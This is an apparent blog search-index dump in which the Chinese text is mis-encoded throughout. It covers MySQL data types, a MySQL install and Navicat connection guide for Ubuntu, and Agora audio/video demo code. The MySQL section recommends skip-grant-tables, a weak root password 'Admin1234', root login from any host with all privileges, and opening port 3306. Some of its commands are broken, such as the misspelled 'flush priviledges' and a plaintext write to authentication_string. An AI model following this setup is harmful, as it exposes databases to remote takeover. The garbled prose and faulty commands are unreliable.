E-38ï¼Œ3.402 823 466 351 E+38) 0ï¼Œ(1.175 494 351 E-38ï¼Œ3.402 823 466 E+38) å•ç²¾åº¦ æµ®ç‚¹æ•°å€¼ DOUBLE 8 Bytes (-1.797 693 134 862 315 7 E+308ï¼Œ-2.225 073 858 507 201 4 E-308)ï¼Œ0ï¼Œ(2.225 073 858 507 201 4 E-308ï¼Œ1.797 693 134 862 315 7 E+308) 0ï¼Œ(2.225 073 858 507 201 4 E-308ï¼Œ1.797 693 134 862 315 7 E+308) åŒç²¾åº¦ æµ®ç‚¹æ•°å€¼ DECIMAL å¯¹DECIMAL(M,D) ï¼Œå¦‚æœM&gt;Dï¼Œä¸ºM+2å¦åˆ™ä¸ºD+2 ä¾èµ–äºMå’ŒDçš„å€¼ ä¾èµ–äºMå’ŒDçš„å€¼ å°æ•°å€¼ æ—¥æœŸå’Œæ—¶é—´ç±»å‹ è¡¨ç¤ºæ—¶é—´å€¼çš„æ—¥æœŸå’Œæ—¶é—´ç±»å‹ä¸ºDATETIMEã€DATEã€TIMESTAMPã€TIMEå’ŒYEARã€‚ æ¯ä¸ªæ—¶é—´ç±»å‹æœ‰ä¸€ä¸ªæœ‰æ•ˆå€¼èŒƒå›´å’Œä¸€ä¸ª&quot;é›¶&quot;å€¼ï¼Œå½“æŒ‡å®šä¸åˆæ³•çš„MySQLä¸èƒ½è¡¨ç¤ºçš„å€¼æ—¶ä½¿ç”¨&quot;é›¶&quot;å€¼ã€‚ TIMESTAMPç±»å‹æœ‰ä¸“æœ‰çš„è‡ªåŠ¨æ›´æ–°ç‰¹æ€§ï¼Œå°†åœ¨åé¢æè¿°ã€‚ ç±»å‹ å¤§å° ( bytes) èŒƒå›´ æ ¼å¼ ç”¨é€” DATE 3 1000-01-01/9999-12-31 YYYY-MM-DD æ—¥æœŸå€¼ TIME 3 â€˜-838:59:59â€™/â€˜838:59:59â€™ HH:MM:SS æ—¶é—´å€¼æˆ–æŒç»­æ—¶é—´ YEAR 1 1901/2155 YYYY å¹´ä»½å€¼ DATETIME 8 â€˜1000-01-01 00:00:00â€™ åˆ° â€˜9999-12-31 23:59:59â€™ YYYY-MM-DD hh:mm:ss æ··åˆæ—¥æœŸå’Œæ—¶é—´å€¼ TIMESTAMP 4 â€˜1970-01-01 00:00:01â€™ UTC åˆ° â€˜2038-01-19 03:14:07â€™ UTCç»“æŸæ—¶é—´æ˜¯ç¬¬ 2147483647 ç§’ï¼ŒåŒ—äº¬æ—¶é—´ 2038-1-19 11:14:07ï¼Œæ ¼æ—å°¼æ²»æ—¶é—´ 2038å¹´1æœˆ19æ—¥ å‡Œæ™¨ 03:14:07 YYYY-MM-DD hh:mm:ss æ··åˆæ—¥æœŸå’Œæ—¶é—´å€¼ï¼Œæ—¶é—´æˆ³ å­—ç¬¦ä¸²ç±»å‹ å­—ç¬¦ä¸²ç±»å‹æŒ‡CHARã€VARCHARã€BINARYã€VARBINARYã€BLOBã€TEXTã€ENUMå’ŒSETã€‚è¯¥èŠ‚æè¿°äº†è¿™äº›ç±»å‹å¦‚ä½•å·¥ä½œä»¥åŠå¦‚ä½•åœ¨æŸ¥è¯¢ä¸­ä½¿ç”¨è¿™äº›ç±»å‹ã€‚ ç±»å‹ å¤§å° ç”¨é€” CHAR 0-255 bytes å®šé•¿å­—ç¬¦ä¸² VARCHAR 0-65535 bytes å˜é•¿å­—ç¬¦ä¸² TINYBLOB 0-255 bytes ä¸è¶…è¿‡ 255 ä¸ªå­—ç¬¦çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸² TINYTEXT 0-255 bytes çŸ­æ–‡æœ¬å­—ç¬¦ä¸² BLOB 0-65 535 bytes äºŒè¿›åˆ¶å½¢å¼çš„é•¿æ–‡æœ¬æ•°æ® TEXT 0-65 535 bytes é•¿æ–‡æœ¬æ•°æ® MEDIUMBLOB 0-16 777 215 bytes äºŒè¿›åˆ¶å½¢å¼çš„ä¸­ç­‰é•¿åº¦æ–‡æœ¬æ•°æ® MEDIUMTEXT 0-16 777 215 bytes ä¸­ç­‰é•¿åº¦æ–‡æœ¬æ•°æ® LONGBLOB 0-4 294 967 295 bytes äºŒè¿›åˆ¶å½¢å¼çš„æå¤§æ–‡æœ¬æ•°æ® LONGTEXT 0-4 294 967 295 bytes æå¤§æ–‡æœ¬æ•°æ® æ³¨æ„ï¼šchar(n) å’Œ varchar(n) ä¸­æ‹¬å·ä¸­ n ä»£è¡¨å­—ç¬¦çš„ä¸ªæ•°ï¼Œå¹¶ä¸ä»£è¡¨å­—èŠ‚ä¸ªæ•°ï¼Œæ¯”å¦‚ CHAR(30) å°±å¯ä»¥å­˜å‚¨ 30 ä¸ªå­—ç¬¦ã€‚ CHAR å’Œ VARCHAR ç±»å‹ç±»ä¼¼ï¼Œä½†å®ƒä»¬ä¿å­˜å’Œæ£€ç´¢çš„æ–¹å¼ä¸åŒã€‚å®ƒä»¬çš„æœ€å¤§é•¿åº¦å’Œæ˜¯å¦å°¾éƒ¨ç©ºæ ¼è¢«ä¿ç•™ç­‰æ–¹é¢ä¹Ÿä¸åŒã€‚åœ¨å­˜å‚¨æˆ–æ£€ç´¢è¿‡ç¨‹ä¸­ä¸è¿›è¡Œå¤§å°å†™è½¬æ¢ã€‚ BINARY å’Œ VARBINARY ç±»ä¼¼äº CHAR å’Œ VARCHARï¼Œä¸åŒçš„æ˜¯å®ƒä»¬åŒ…å«äºŒè¿›åˆ¶å­—ç¬¦ä¸²è€Œä¸è¦éäºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒä»¬åŒ…å«å­—èŠ‚å­—ç¬¦ä¸²è€Œä¸æ˜¯å­—ç¬¦å­—ç¬¦ä¸²ã€‚è¿™è¯´æ˜å®ƒä»¬æ²¡æœ‰å­—ç¬¦é›†ï¼Œå¹¶ä¸”æ’åºå’Œæ¯”è¾ƒåŸºäºåˆ—å€¼å­—èŠ‚çš„æ•°å€¼å€¼ã€‚ BLOB æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶å¤§å¯¹è±¡ï¼Œå¯ä»¥å®¹çº³å¯å˜æ•°é‡çš„æ•°æ®ã€‚æœ‰ 4 ç§ BLOB ç±»å‹ï¼šTINYBLOBã€BLOBã€MEDIUMBLOB å’Œ LONGBLOBã€‚å®ƒä»¬åŒºåˆ«åœ¨äºå¯å®¹çº³å­˜å‚¨èŒƒå›´ä¸åŒã€‚ æœ‰ 4 ç§ TEXT ç±»å‹ï¼šTINYTEXTã€TEXTã€MEDIUMTEXT å’Œ LONGTEXTã€‚å¯¹åº”çš„è¿™ 4 ç§ BLOB ç±»å‹ï¼Œå¯å­˜å‚¨çš„æœ€å¤§é•¿åº¦ä¸åŒï¼Œå¯æ ¹æ®å®é™…æƒ…å†µé€‰æ‹©ã€‚","tags":[{"name":"Database","slug":"Database","permalink":"https://hodlyounger.github.io/tags/Database/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"æ•°æ®åº“","slug":"B-Code/æ•°æ®åº“","permalink":"https://hodlyounger.github.io/categories/B-Code/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"MYSQL","slug":"B-Code/æ•°æ®åº“/MYSQL","permalink":"https://hodlyounger.github.io/categories/B-Code/%E6%95%B0%E6%8D%AE%E5%BA%93/MYSQL/"}]},{"title":"ã€MYSQLã€‘Ubuntu22.04å®‰è£… MYSQL å¹¶ä½¿ç”¨ navicat è¿æ¥","date":"2023-10-27T01:24:02.350Z","path":"B_Code/æ•°æ®åº“/MYSQL/ã€MYSQLã€‘å®‰è£… MYSQL å¹¶ä½¿ç”¨ navicat è¿æ¥/","text":"[toc] å®‰è£… Ubuntu å®‰è£… mysql çš„æ•™ç¨‹ç½‘ä¸Šä¸€å¤§å †ã€‚ 1sudo apt-get install mysql-server é…ç½® ä¿®æ”¹é…ç½®æ–‡ä»¶ 1sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf åœ¨ [mysqld] æ·»åŠ  skip-grant-tables é‡å¯æ•°æ®åº“ 12345sudo systemctl restart mysql# æˆ–è€…sudo service mysql restart ä¿®æ”¹ç”¨æˆ·å±æ€§ è¿›å…¥ mysql 1234sudo mysql -u root# åˆ‡æ¢åˆ° mysql æ•°æ®åº“use mysql; æ›´æ–°ç”¨æˆ·å¯†ç  12345alter user root identified with mysql_native_password by &#x27;Admin1234&#x27;;# æˆ–è€…update user set authentication_string=&#x27;Admin1234&#x27; where user=&#x27;admin&#x27;; åˆ°æ­¤å°±å¯ä»¥ä½¿ç”¨ç”¨æˆ·ç™»å½•äº†ã€‚ 1mysql -u root -p è¡¥å……ï¼Œåˆ›å»ºå…¶ä»–ç”¨æˆ· 1CREATE USER &#x27;username&#x27;@&#x27;host&#x27; IDENTIFIED BY &#x27;password&#x27;; æˆæƒè¿œç¨‹ä½¿ç”¨ æ›´æ”¹æˆæƒåï¼Œä¸€å®šè¦æ‰§è¡Œ flush priviledges;ã€‚ 1grant all on *.* to &#x27;root&#x27;@&#x27;%&#x27;; æ‰§è¡Œä¸Šä¸€æ­¥å¯èƒ½ä¼šæŠ¥é”™ï¼Œå› ä¸ºåœ¨ ä¸Šä¸€æ­¥ ä¿®æ”¹ç”¨æˆ·å¯†ç æ—¶ï¼Œè®¾ç½®äº†åœ°å€ä¸º localhostã€‚æ‰€ä»¥è¿™é‡Œä¸èƒ½ç›´æ¥æˆæƒå…¶ä»–ä¸»æœºè®¿é—®ï¼Œéœ€è¦å…ˆæŠŠrootè´¦å·çš„hostä¿®æ”¹ä¸ºå¯ä»¥è®¿é—®æ‰€æœ‰ä¸»æœºï¼Œå†å»æˆæƒã€‚ ä¿®æ”¹rootè´¦æˆ· 123update user set host=&#x27;%&#x27; where user=&#x27;root&#x27;;flush priviledges; æˆæƒè¿œç¨‹ä½¿ç”¨ 123grant all on *.* to &#x27;root&#x27;@&#x27;%&#x27;;flush priviledges; é‡å¯æ•°æ®åº“ 12345sudo systemctl restart mysql# æˆ–è€…sudo service mysql restart ä½¿ç”¨ navicat è¿æ¥æ•°æ®åº“ å¦‚æœå‡ºç°è¿æ¥æ—¶æŠ¥é”™ 1130-host ... is not allowed to connect to this MySql serverã€‚åˆ™è¯´æ˜æ˜¯æœåŠ¡å™¨ç«¯å£æƒé™æ²¡å¼€æ”¾ã€‚ç®€å•æ”¹åŠ¨å¯ç›´æ¥ä½¿ç”¨ufwå‘½ä»¤ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š sudo ufw allow 3306 å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š è¿æ¥åï¼šéšä¾¿èµ·åï¼Œç”¨æ¥åŒºåˆ†è¿æ¥çš„æ•°æ®åº“ ä¸»æœºï¼š192.168.0.102 ä¸ºè™šæ‹Ÿæœºçš„ipåœ°å€ ç«¯å£ï¼š3306,mysqlé»˜è®¤ç«¯å£ ç”¨æˆ·åï¼šroot å¯†ç ï¼šå¯†ç ","tags":[{"name":"æ•°æ®åº“","slug":"æ•°æ®åº“","permalink":"https://hodlyounger.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"Linux/Ubuntu","slug":"Linux-Ubuntu","permalink":"https://hodlyounger.github.io/tags/Linux-Ubuntu/"},{"name":"navicat","slug":"navicat","permalink":"https://hodlyounger.github.io/tags/navicat/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"æ•°æ®åº“","slug":"B-Code/æ•°æ®åº“","permalink":"https://hodlyounger.github.io/categories/B-Code/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"MYSQL","slug":"B-Code/æ•°æ®åº“/MYSQL","permalink":"https://hodlyounger.github.io/categories/B-Code/%E6%95%B0%E6%8D%AE%E5%BA%93/MYSQL/"}]},{"title":"ã€å£°ç½‘ã€‘éŸ³é¢‘æˆ¿é—´åˆ›å»ºåŠè¿æ¥è¯´æ˜","date":"2023-10-27T01:24:02.345Z","path":"B_Code/TypeScript/ã€å£°ç½‘ã€‘éŸ³é¢‘ä¼ è¾“/","text":"æ¦‚è¿°ï¼šå£°ç½‘å¼€æºçš„éŸ³é¢‘ä¼ è¾“é¡¹ç›® å£°ç½‘å¼€æºé€šè¯ä»£ç  API-Examples-Web/Demo/selfRendering at main Â· AgoraIO/API-Examples-Web UI CSS 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950.banner &#123; padding: 0; background-color: #52575c; color: white;&#125;.banner-text &#123; padding: 8px 20px; margin: 0;&#125;#join-form &#123; margin-top: 10px;&#125;.tips &#123; font-size: 12px; margin-bottom: 2px; color: gray;&#125;.join-info-text &#123; margin-bottom: 2px;&#125;input &#123; width: 100%; margin-bottom: 2px;&#125;.player &#123; width: 480px; height: 320px;&#125;.player-name &#123; margin: 8px 0;&#125;#success-alert, #success-alert-with-token &#123; display: none;&#125;@media (max-width: 640px) &#123; .player &#123; width: 320px; height: 240px; &#125;&#125; HTML 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Video Self-Rendering -- Agora&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;../assets/bootstrap.min.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;./index.css&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container-fluid banner&quot;&gt; &lt;p class=&quot;banner-text&quot;&gt;Video Self-Rendering&lt;/p&gt; &lt;a style=&quot;color: rgb(255, 255, 255);fill: rgb(255, 255, 255);fill-rule: evenodd; position: absolute; right: 10px; top: 4px;&quot; class=&quot;Header-link &quot; href=&quot;https://github.com/AgoraIO/API-Examples-Web/tree/main/Demo&quot;&gt; &lt;svg class=&quot;octicon octicon-mark-github v-align-middle&quot; height=&quot;32&quot; viewBox=&quot;0 0 16 16&quot; version=&quot;1.1&quot; width=&quot;32&quot; aria-hidden=&quot;true&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z&quot;&gt;&lt;/path&gt;&lt;/svg&gt; &lt;/a&gt; &lt;/div&gt; &lt;div id=&quot;success-alert&quot; class=&quot;alert alert-success alert-dismissible fade show&quot; role=&quot;alert&quot;&gt; &lt;strong&gt;Congratulations!&lt;/strong&gt;&lt;span&gt; You can invite others to watch your live by click &lt;/span&gt;&lt;a href=&quot;&quot; target=&quot;_blank&quot;&gt;here&lt;/a&gt; &lt;button type=&quot;button&quot; class=&quot;close&quot; data-dismiss=&quot;alert&quot; aria-label=&quot;Close&quot;&gt; &lt;span aria-hidden=&quot;true&quot;&gt;&amp;times;&lt;/span&gt; &lt;/button&gt; &lt;/div&gt; &lt;div class=&quot;container&quot;&gt; &lt;form id=&quot;join-form&quot; name=&quot;join-form&quot;&gt; &lt;div class=&quot;row join-info-group&quot;&gt; &lt;div class=&quot;col-sm&quot;&gt; &lt;p class=&quot;join-info-text&quot;&gt;AppID&lt;/p&gt; &lt;input id=&quot;appid&quot; type=&quot;text&quot; placeholder=&quot;enter appid&quot; required&gt; &lt;p class=&quot;tips&quot;&gt;If you don`t know what is your appid, checkout &lt;a href=&quot;https://docs.agora.io/en/Agora%20Platform/terms?platform=All%20Platforms#a-nameappidaapp-id&quot;&gt;this&lt;/a&gt;&lt;/p&gt; &lt;/div&gt; &lt;div class=&quot;col-sm&quot;&gt; &lt;p class=&quot;join-info-text&quot;&gt;Token(optional)&lt;/p&gt; &lt;input id=&quot;token&quot; type=&quot;text&quot; placeholder=&quot;enter token&quot;&gt; &lt;p class=&quot;tips&quot;&gt;If you don`t know what is your token, checkout &lt;a href=&quot;https://docs.agora.io/en/Agora%20Platform/terms?platform=All%20Platforms#a-namekeyadynamic-key&quot;&gt;this&lt;/a&gt;&lt;/p&gt; &lt;/div&gt; &lt;div class=&quot;col-sm&quot;&gt; &lt;p class=&quot;join-info-text&quot;&gt;Channel&lt;/p&gt; &lt;input id=&quot;channel&quot; type=&quot;text&quot; placeholder=&quot;enter channel name&quot; required&gt; &lt;p class=&quot;tips&quot;&gt;If you don`t know what is your channel, checkout &lt;a href=&quot;https://docs.agora.io/en/Agora%20Platform/terms?platform=All%20Platforms#channel&quot;&gt;this&lt;/a&gt;&lt;/p&gt; &lt;/div&gt; &lt;div class=&quot;col-sm&quot;&gt; &lt;p class=&quot;join-info-text&quot;&gt;User ID(optional)&lt;/p&gt; &lt;input id=&quot;uid&quot; type=&quot;text&quot; onkeyup=&quot;this.value=this.value.replace(/[^0-9]/g,&#x27;&#x27;)&quot; onafterpaste=&quot;this.value=this.value.replace(/[^0-9]/g,&#x27;&#x27;)&quot; placeholder=&quot;Enter the user ID&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;button-group&quot;&gt; &lt;button id=&quot;host-join&quot; type=&quot;submit&quot; class=&quot;btn btn-primary btn-sm&quot;&gt;Join as host&lt;/button&gt; &lt;div class=&quot;btn-group&quot;&gt; &lt;button id=&quot;audience-join&quot; type=&quot;button&quot; class=&quot;btn btn-primary btn-sm&quot; data-toggle=&quot;dropdown&quot; aria-haspopup=&quot;true&quot; aria-expanded=&quot;false&quot;&gt; Join as audience &lt;/button&gt; &lt;div class=&quot;audience dropdown-menu&quot;&gt; &lt;a id=&quot;lowLatency&quot; class=&quot;dropdown-item&quot; label=&quot;Interactive Live Streaming Standard&quot; href=&quot;#&quot;&gt;Interactive Live Streaming Standard&lt;/a&gt; &lt;a id=&quot;ultraLowLatency&quot; class=&quot;dropdown-item&quot; label=&quot;Interactive Live Streaming Premium&quot; href=&quot;#&quot;&gt;Interactive Live Streaming Premium&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;button id=&quot;leave&quot; type=&quot;button&quot; class=&quot;btn btn-primary btn-sm&quot; disabled&gt;Leave&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;!-- Single button --&gt; &lt;div class=&quot;row video-group&quot;&gt; &lt;div class=&quot;col&quot;&gt; &lt;p id=&quot;local-player-name&quot; class=&quot;player-name&quot;&gt;&lt;/p&gt; &lt;div id=&quot;local-player&quot; class=&quot;player&quot;&gt;&lt;/div&gt; &lt;div id=&quot;local-player-mirror-area&quot; class=&quot;player video-mirror&quot; title=&quot;Video Mirror&quot; style=&quot;display: none; border: 2px dashed red ;&quot;&gt; &lt;div id=&quot;local-player-mirror&quot; style=&quot;width: 100%; height: 100%; position: relative; overflow: hidden; background-color: black;&quot;&gt; &lt;video id=&quot;local-player-mirror-video-track&quot; class=&quot;agora_video_player&quot; playsinline=&quot;&quot; muted=&quot;&quot; style=&quot;width: 100%; height: 100%; position: absolute; left: 0px; top: 0px; transform: rotateY(180deg); object-fit: cover;&quot;&gt; &lt;/video&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;w-100&quot;&gt;&lt;/div&gt; &lt;div class=&quot;col&quot;&gt; &lt;div id=&quot;remote-playerlist&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src=&quot;../assets/jquery-3.4.1.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;../assets/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://download.agora.io/sdk/release/AgoraRTC_N.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./index.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; é€šè¯é€»è¾‘ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199// create Agora clientvar client = AgoraRTC.createClient(&#123;mode: &quot;live&quot;, codec: &quot;vp8&quot;&#125;);AgoraRTC.enableLogUpload();var localTracks = &#123; videoTrack: null, audioTrack: null&#125;;var remoteUsers = &#123;&#125;;// Agora client optionsvar options = &#123; appid: null, channel: null, uid: null, token: null, role: &quot;audience&quot;, // host or audience audienceLatency: 2&#125;;// the demo can auto join channel with params in url$(() =&gt; &#123; var urlParams = new URL(location.href).searchParams; options.appid = urlParams.get(&quot;appid&quot;); options.channel = urlParams.get(&quot;channel&quot;); options.token = urlParams.get(&quot;token&quot;); options.uid = urlParams.get(&quot;uid&quot;); if (options.appid &amp;&amp; options.channel) &#123; $(&quot;#uid&quot;).val(options.uid); $(&quot;#appid&quot;).val(options.appid); $(&quot;#token&quot;).val(options.token); $(&quot;#channel&quot;).val(options.channel); $(&quot;#join-form&quot;).submit(); &#125;&#125;)$(&quot;#host-join&quot;).click(function (e) &#123; options.role = &quot;host&quot;&#125;)$(&quot;#lowLatency&quot;).click(function (e) &#123; options.role = &quot;audience&quot; options.audienceLatency = 1 $(&quot;#join-form&quot;).submit()&#125;)$(&quot;#ultraLowLatency&quot;).click(function (e) &#123; options.role = &quot;audience&quot; options.audienceLatency = 2 $(&quot;#join-form&quot;).submit()&#125;)$(&quot;#join-form&quot;).submit(async function (e) &#123; e.preventDefault(); $(&quot;#host-join&quot;).attr(&quot;disabled&quot;, true); $(&quot;#audience-join&quot;).attr(&quot;disabled&quot;, true); try &#123; options.appid = $(&quot;#appid&quot;).val(); options.token = $(&quot;#token&quot;).val(); options.channel = $(&quot;#channel&quot;).val(); options.uid = Number($(&quot;#uid&quot;).val()); await join(); if (options.role === &quot;host&quot;) &#123; $(&quot;#success-alert a&quot;).attr(&quot;href&quot;, `index.html?appid=$&#123;options.appid&#125;&amp;channel=$&#123;options.channel&#125;&amp;token=$&#123;options.token&#125;`); if (options.token) &#123; $(&quot;#success-alert-with-token&quot;).css(&quot;display&quot;, &quot;block&quot;); &#125; else &#123; $(&quot;#success-alert a&quot;).attr(&quot;href&quot;, `index.html?appid=$&#123;options.appid&#125;&amp;channel=$&#123;options.channel&#125;&amp;token=$&#123;options.token&#125;`); $(&quot;#success-alert&quot;).css(&quot;display&quot;, &quot;block&quot;); &#125; &#125; &#125; catch (error) &#123; console.error(error); &#125; finally &#123; $(&quot;#leave&quot;).attr(&quot;disabled&quot;, false); &#125;&#125;)$(&quot;#leave&quot;).click(function (e) &#123; leave();&#125;)async function join() &#123; // create Agora client if (options.role === &quot;audience&quot;) &#123; client.setClientRole(options.role, &#123;level: options.audienceLatency&#125;); // add event listener to play remote tracks when remote user publishs. client.on(&quot;user-published&quot;, handleUserPublished); client.on(&quot;user-unpublished&quot;, handleUserUnpublished); &#125; else&#123; client.setClientRole(options.role); &#125; // join the channel options.uid = await client.join(options.appid, options.channel, options.token || null, options.uid || null); if (options.role === &quot;host&quot;) &#123; // create local audio and video tracks localTracks.audioTrack = await AgoraRTC.createMicrophoneAudioTrack(); localTracks.videoTrack = await AgoraRTC.createCameraVideoTrack(); // play local video track localTracks.videoTrack.play(&quot;local-player&quot;); $(&quot;#local-player-name&quot;).text(`localTrack($&#123;options.uid&#125;)`); //create the mirror of local player $(&quot;#local-player-mirror-area&quot;).show(); var mirrorPlayer = document.getElementById(&quot;local-player-mirror-video-track&quot;); //get browser-native object MediaStreamTrack from WebRTC SDK const msTrack = localTracks.videoTrack.getMediaStreamTrack(); //generate browser-native object MediaStream with above video track const ms = new MediaStream([msTrack]) mirrorPlayer.srcObject = ms; mirrorPlayer.play(); // publish local tracks to channel await client.publish(Object.values(localTracks)); console.log(&quot;publish success&quot;); &#125;&#125;async function leave() &#123; for (trackName in localTracks) &#123; var track = localTracks[trackName]; if (track) &#123; track.stop(); track.close(); localTracks[trackName] = undefined; &#125; &#125; // remove remote users and player views remoteUsers = &#123;&#125;; $(&quot;#remote-playerlist&quot;).html(&quot;&quot;); // leave the channel await client.leave(); $(&quot;#local-player-name&quot;).text(&quot;&quot;); $(&quot;#host-join&quot;).attr(&quot;disabled&quot;, false); $(&quot;#audience-join&quot;).attr(&quot;disabled&quot;, false); $(&quot;#leave&quot;).attr(&quot;disabled&quot;, true); $(&quot;.video-mirror&quot;).hide(); console.log(&quot;client leaves channel success&quot;);&#125;async function subscribe(user, mediaType) &#123; const uid = user.uid; // subscribe to a remote user await client.subscribe(user, mediaType); console.log(&quot;subscribe success&quot;); if (mediaType === &#x27;video&#x27;) &#123; const player = $(` &lt;div id=&quot;player-wrapper-$&#123;uid&#125;&quot;&gt; &lt;p class=&quot;player-name&quot;&gt;remoteUser($&#123;uid&#125;)&lt;/p&gt; &lt;div id=&quot;player-$&#123;uid&#125;&quot; class=&quot;player&quot;&gt;&lt;/div&gt; &lt;p class=&quot;player-name&quot;&gt;Video Mirror&lt;/p&gt; &lt;div id=&quot;player-$&#123;uid&#125;-mirror-area&quot; class=&quot;player&quot; style=&quot;border: 2px dashed red ;&quot;&gt; &lt;div style=&quot;width: 100%; height: 100%; position: relative; overflow: hidden; background-color: black;&quot;&gt; &lt;video id=&quot;video_track-video-$&#123;uid&#125;-mirror&quot; class=&quot;agora_video_player&quot; playsinline=&quot;&quot; muted=&quot;&quot; style=&quot;width: 100%; height: 100%; position: absolute; left: 0px; top: 0px; object-fit: contain;&quot;&gt; &lt;/video&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; `); $(&quot;#remote-playerlist&quot;).append(player); user.videoTrack.play(`player-$&#123;uid&#125;`, &#123;fit:&quot;contain&quot;&#125;); //handling the mirror video $(`#player-$&#123;uid&#125;-mirror-area`).show(); var mirrorRemotePlayer = document.getElementById(`video_track-video-$&#123;uid&#125;-mirror`); //get browser-native object MediaStreamTrack from WebRTC SDK const msTrack = user.videoTrack.getMediaStreamTrack(); //generate browser-native object MediaStream with above video track const ms = new MediaStream([msTrack]) mirrorRemotePlayer.srcObject = ms; mirrorRemotePlayer.play(); &#125; if (mediaType === &#x27;audio&#x27;) &#123; user.audioTrack.play(); &#125;&#125;function handleUserPublished(user, mediaType) &#123; const id = user.uid; remoteUsers[id] = user; subscribe(user, mediaType);&#125;function handleUserUnpublished(user, mediaType) &#123; if (mediaType === &#x27;video&#x27;) &#123; const id = user.uid; delete remoteUsers[id]; $(`#player-wrapper-$&#123;id&#125;`).remove(); &#125;&#125; æ”¹åŠ¨ç‚¹ æ–°å»ºä¸€ä¸ªé…ç½®é¡µé¢ï¼Œç”±ç”¨æˆ·è¿›å…¥æˆ¿é—´æ—¶å¡«å†™ AppId,token,channelç­‰ js ä»£ç æ”¹åŠ¨ç‚¹ï¼š 1234options.appid = $(&quot;#appid&quot;).val();options.token = $(&quot;#token&quot;).val();options.channel = $(&quot;#channel&quot;).val();options.uid = Number($(&quot;#uid&quot;).val());","tags":[{"name":"å£°ç½‘","slug":"å£°ç½‘","permalink":"https://hodlyounger.github.io/tags/%E5%A3%B0%E7%BD%91/"},{"name":"æ¯”èµ›","slug":"æ¯”èµ›","permalink":"https://hodlyounger.github.io/tags/%E6%AF%94%E8%B5%9B/"},{"name":"éŸ³é¢‘","slug":"éŸ³é¢‘","permalink":"https://hodlyounger.github.io/tags/%E9%9F%B3%E9%A2%91/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"TypeScript","slug":"B-Code/TypeScript","permalink":"https://hodlyounger.github.io/categories/B-Code/TypeScript/"}]},{"title":"ã€å£°ç½‘ã€‘åˆ›å»ºå®æ—¶éŸ³é¢‘","date":"2023-10-27T01:24:02.344Z","path":"B_Code/TypeScript/ã€å£°ç½‘ã€‘åˆ›å»ºå®æ—¶éŸ³é¢‘/","text":"[Toc] å¿«é€Ÿä¸Šæ‰‹ å®‰è£… 1npm add @netless/fastboard @netless/window-manager white-web-sdk åˆ›å»ºå®æ—¶éŸ³é¢‘ é‡‡é›†éŸ³è§†é¢‘ç›¸å…³ 1. è·å–æ‘„åƒå¤´åˆ—è¡¨ è°ƒç”¨ getMicrophones è·å–å¯ç”¨çš„æ‘„åƒå¤´åˆ—è¡¨ getMicrophones æ–¹æ³•ä¼šé€šè¿‡ Promise å¼‚æ­¥è¿”å›ä¸€ä¸ª MediaDeviceInfo å¯¹è±¡çš„æ•°ç»„ã€‚MediaDeviceInfo å¯¹è±¡å¤ç”¨äº† WebRTC API ä¸­çš„ MediaDeviceInfo å¯¹è±¡ã€‚å› ä¸ºæ˜¯å¼‚æ­¥æ–¹æ³•ï¼Œä½ å¯ä»¥ä½¿ç”¨ then/catch (ES6) æˆ– async/await (ES7) 